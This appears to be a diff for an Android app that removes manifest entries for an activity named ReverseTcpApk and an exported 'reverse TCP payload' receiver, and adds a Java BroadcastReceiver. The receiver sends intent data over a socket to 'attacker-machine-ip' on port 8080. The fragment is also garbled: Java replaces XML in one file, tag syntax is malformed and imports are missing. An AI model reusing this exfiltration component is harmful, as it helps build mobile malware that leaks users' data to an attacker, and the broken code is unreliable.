@@ -1,41 +1,43 @@
-<uses-permission android:name="android.permission.INTERNET" />
 
-<application>
+import android.content.BroadcastReceiver;
 
-<activity
+import android.content.Context;
 
-android:name=".ReverseTcpApk"
-
-android:label="@string/app_name">
-
-<intent-filter>
-
-<action android:name="android.intent.action.MAIN" />
-
-<category android:name="android.intent.category.LAUNCHER" />
-
-</intent-filter>
-
-</activity>
-
-</application>
+import android.content.Intent;
 
 
 
-<!-- Add our reverse TCP payload -->
+public class PayloadReceiver extends BroadcastReceiver {
 
-<receiver
+@Override
 
-android:name=".PayloadReceiver"
+public void onReceive(Context context, Intent intent) {
 
-android:enabled="true"
+// Receive data over the reverse TCP connection
 
-android:exported="true">
+String receivedData = intent.getStringExtra("RECEIVED_DATA");
 
-<intent-filter>
 
-<action.android.name = "com.example.REVERSE_TCP_PAYLOAD"/>
 
-</intent-filter>
+// Send data to our payload
 
-</receiver>
+try {
+
+Socket socket = new Socket("attacker-machine-ip", 8080);
+
+OutputStream outputStream = socket.getOutputStream();
+
+outputStream.write(receivedData.getBytes());
+
+socket.close();
+
+} catch (IOException e) {
+
+Log.e("PayloadReceiver", "Error sending data: " + e.getMessage());
+
+}
+
+}
+
+}
+
